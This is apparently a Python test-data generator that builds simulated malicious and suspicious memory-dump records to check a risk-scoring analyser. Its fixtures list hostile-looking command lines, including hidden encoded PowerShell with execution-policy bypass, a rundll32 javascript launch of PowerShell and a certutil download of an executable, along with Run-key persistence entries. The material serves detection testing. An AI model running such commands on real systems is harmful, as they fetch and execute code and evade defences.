#!/usr/bin/env python3
"""
Create high-risk test data for memory dump analysis
This generates realistic data structures that would trigger high risk scores
"""

import json
import os
from datetime import datetime

def create_high_risk_memory_data():
    """Create realistic high-risk memory dump data for testing"""
    
    print("🔴 Creating High-Risk Memory Dump Test Data")
    print("=" * 50)
    
    # High-risk scenario: Advanced Persistent Threat (APT) simulation
    high_risk_data = {
        "metadata": {
            "filename": "apt_compromise_memory.dmp",
            "size": 2147483648,  # 2GB
            "timestamp": datetime.now().isoformat(),
            "description": "Simulated APT compromise with multiple attack vectors"
        },
        "processes": [
            {
                "pid": 4,
                "name": "System",
                "ppid": 0,
                "path": "C:\\Windows\\System32\\ntoskrnl.exe",
                "cmdline": "System",
                "signature_status": "signed"
            },
            {
                "pid": 1000,
                "name": "explorer.exe",
                "ppid": 4,
                "path": "C:\\Windows\\explorer.exe",
                "cmdline": "explorer.exe",
                "signature_status": "signed"
            },
            # Suspicious PowerShell activity
            {
                "pid": 1234,
                "name": "powershell.exe",
                "ppid": 1000,
                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "cmdline": "powershell.exe -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAMQAwAA== -WindowStyle Hidden -ExecutionPolicy Bypass",
                "signature_status": "unsigned"
            },
            # LOLBin abuse
            {
                "pid": 2345,
                "name": "rundll32.exe",
                "ppid": 1234,
                "path": "C:\\Windows\\System32\\rundll32.exe",
                "cmdline": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WScript.Shell\").run(\"cmd /c powershell -enc [ENCODED_PAYLOAD]\",0,true);",
                "signature_status": "signed"
            },
            # Malware in temp directory
            {
                "pid": 3456,
                "name": "svchost.exe",
                "ppid": 1234,
                "path": "C:\\Users\\Public\\svchost.exe",
                "cmdline": "svchost.exe -k netsvcs",
                "signature_status": "unsigned"
            },
            # Suspicious parent-child relationship
            {
                "pid": 4567,
                "name": "notepad.exe",
                "ppid": 1000,
                "path": "C:\\Windows\\System32\\notepad.exe",
                "cmdline": "notepad.exe",
                "signature_status": "signed"
            },
            {
                "pid": 5678,
                "name": "cmd.exe",
                "ppid": 4567,
                "path": "C:\\Windows\\System32\\cmd.exe",
                "cmdline": "cmd.exe /c powershell -enc [MALICIOUS_PAYLOAD]",
                "signature_status": "signed"
            }
        ],
        "network_connections": [
            # Suspicious ports
            {
                "remote": "203.0.113.1:4444",
                "local": "192.168.1.100:12345",
                "protocol": "TCP",
                "state": "ESTABLISHED"
            },
            {
                "remote": "198.51.100.50:8080",
                "local": "192.168.1.100:54321",
                "protocol": "TCP",
                "state": "ESTABLISHED"
            },
            {
                "remote": "10.0.0.1:1337",
                "local": "192.168.1.100:9999",
                "protocol": "TCP",
                "state": "ESTABLISHED"
            },
            # Non-standard HTTP ports
            {
                "remote": "172.16.0.100:8000",
                "local": "192.168.1.100:8888",
                "protocol": "TCP",
                "state": "ESTABLISHED"
            },
            # Normal traffic (for contrast)
            {
                "remote": "8.8.8.8:53",
                "local": "192.168.1.100:12345",
                "protocol": "UDP",
                "state": "ESTABLISHED"
            }
        ],
        "system_info": {
            "registry": [
                # Persistence mechanisms
                {
                    "key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "value": "WindowsUpdate",
                    "data": "C:\\Users\\Public\\svchost.exe"
                },
                {
                    "key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "value": "SystemService",
                    "data": "C:\\Windows\\System32\\malware.exe"
                },
                {
                    "key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                    "value": "Cleanup",
                    "data": "C:\\Windows\\Temp\\cleanup.exe"
                }
            ],
            "files": [
                # Executables in suspicious locations
                {
                    "path": "C:\\Users\\Public\\svchost.exe",
                    "executable": True,
                    "size": 1024000,
                    "created": "2024-01-15T10:30:00Z"
                },
                {
                    "path": "C:\\Windows\\Temp\\malware.dll",
                    "executable": True,
                    "size": 512000,
                    "created": "2024-01-15T10:35:00Z"
                },
                {
                    "path": "C:\\Users\\Public\\Documents\\backdoor.exe",
                    "executable": True,
                    "size": 2048000,
                    "created": "2024-01-15T10:40:00Z"
                },
                {
                    "path": "C:\\Windows\\System32\\drivers\\rootkit.sys",
                    "executable": True,
                    "size": 256000,
                    "created": "2024-01-15T10:45:00Z"
                }
            ],
            "services": [
                {
                    "name": "WindowsUpdateService",
                    "display_name": "Windows Update Service",
                    "path": "C:\\Users\\Public\\svchost.exe",
                    "status": "Running"
                }
            ]
        }
    }
    
    return high_risk_data

def create_medium_risk_data():
    """Create medium-risk test data"""
    
    medium_risk_data = {
        "metadata": {
            "filename": "suspicious_activity_memory.dmp",
            "size": 1073741824,  # 1GB
            "timestamp": datetime.now().isoformat(),
            "description": "Simulated suspicious user activity"
        },
        "processes": [
            {
                "pid": 4,
                "name": "System",
                "ppid": 0,
                "path": "C:\\Windows\\System32\\ntoskrnl.exe",
                "cmdline": "System",
                "signature_status": "signed"
            },
            {
                "pid": 1000,
                "name": "explorer.exe",
                "ppid": 4,
                "path": "C:\\Windows\\explorer.exe",
                "cmdline": "explorer.exe",
                "signature_status": "signed"
            },
            # Some suspicious activity
            {
                "pid": 1234,
                "name": "powershell.exe",
                "ppid": 1000,
                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "cmdline": "powershell.exe -Command Get-Process",
                "signature_status": "signed"
            },
            {
                "pid": 2345,
                "name": "certutil.exe",
                "ppid": 1234,
                "path": "C:\\Windows\\System32\\certutil.exe",
                "cmdline": "certutil.exe -urlcache -split -f http://example.com/file.exe",
                "signature_status": "signed"
            }
        ],
        "network_connections": [
            {
                "remote": "8.8.8.8:53",
                "local": "192.168.1.100:12345",
                "protocol": "UDP",
                "state": "ESTABLISHED"
            },
            {
                "remote": "example.com:80",
                "local": "192.168.1.100:54321",
                "protocol": "TCP",
                "state": "ESTABLISHED"
            }
        ],
        "system_info": {
            "registry": [],
            "files": [
                {
                    "path": "C:\\Users\\Public\\Downloads\\suspicious.exe",
                    "executable": True,
                    "size": 512000,
                    "created": "2024-01-15T11:00:00Z"
                }
            ]
        }
    }
    
    return medium_risk_data

def save_test_data():
    """Save test data to files"""
    
    # Create test data directory
    test_dir = "test_memory_dumps"
    os.makedirs(test_dir, exist_ok=True)
    
    # High-risk data
    high_risk = create_high_risk_memory_data()
    high_risk_file = os.path.join(test_dir, "high_risk_memory_dump.json")
    with open(high_risk_file, 'w') as f:
        json.dump(high_risk, f, indent=2)
    
    # Medium-risk data
    medium_risk = create_medium_risk_data()
    medium_risk_file = os.path.join(test_dir, "medium_risk_memory_dump.json")
    with open(medium_risk_file, 'w') as f:
        json.dump(medium_risk, f, indent=2)
    
    print(f"✅ Test data saved to:")
    print(f"   High Risk: {high_risk_file}")
    print(f"   Medium Risk: {medium_risk_file}")
    
    return high_risk_file, medium_risk_file

def test_with_risk_analyzer():
    """Test the generated data with RiskAnalyzer"""
    
    print(f"\n🧪 Testing Generated Data with RiskAnalyzer")
    print("=" * 50)
    
    # Import RiskAnalyzer
    import sys
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from services.risk_analyzer import RiskAnalyzer
    
    analyzer = RiskAnalyzer()
    
    # Test high-risk data
    high_risk = create_high_risk_memory_data()
    high_result = analyzer.analyze_risk(
        high_risk, high_risk, high_risk['system_info']
    )
    
    print(f"🔴 HIGH-RISK DATA RESULTS:")
    print(f"   Risk Score: {high_result['risk_score']}/100")
    print(f"   Risk Level: {high_result['risk_level']}")
    print(f"   Risk Factors: {len(high_result['risk_factors'])}")
    print(f"   Confidence: {high_result['confidence']}%")
    
    # Test medium-risk data
    medium_risk = create_medium_risk_data()
    medium_result = analyzer.analyze_risk(
        medium_risk, medium_risk, medium_risk['system_info']
    )
    
    print(f"\n🟡 MEDIUM-RISK DATA RESULTS:")
    print(f"   Risk Score: {medium_result['risk_score']}/100")
    print(f"   Risk Level: {medium_result['risk_level']}")
    print(f"   Risk Factors: {len(medium_result['risk_factors'])}")
    print(f"   Confidence: {medium_result['confidence']}%")
    
    return high_result, medium_result

def show_usage_instructions():
    """Show how to use the generated test data"""
    
    print(f"\n📖 HOW TO USE THE TEST DATA")
    print("=" * 30)
    
    print("""
1. The generated JSON files contain realistic memory dump data structures
2. You can use these to test your enhanced risk analysis system
3. To test with your dashboard:

   Option A - Modify your app to load test data:
   - Replace the demo data in app.py with the high-risk data
   - Upload the JSON file as if it were a memory dump
   
   Option B - Convert to actual memory dump format:
   - Use the data structures to create realistic .dmp files
   - Test with your actual analysis pipeline

4. Expected Results:
   - High-risk data should score 80-100 (Critical)
   - Medium-risk data should score 40-60 (Medium)
   - Your dashboard will show detailed threat analysis

5. Safety Note:
   - This is simulated data, safe for testing
   - No actual malware is included
   - Use in isolated environment for best practices
""")

if __name__ == '__main__':
    # Generate and save test data
    high_file, medium_file = save_test_data()
    
    # Test with RiskAnalyzer
    high_result, medium_result = test_with_risk_analyzer()
    
    # Show usage instructions
    show_usage_instructions()
    
    print(f"\n✅ High-risk test data ready!")
    print(f"Expected risk score: {high_result['risk_score']} ({high_result['risk_level']})")
    print(f"Use this data to test your enhanced risk analysis system!")

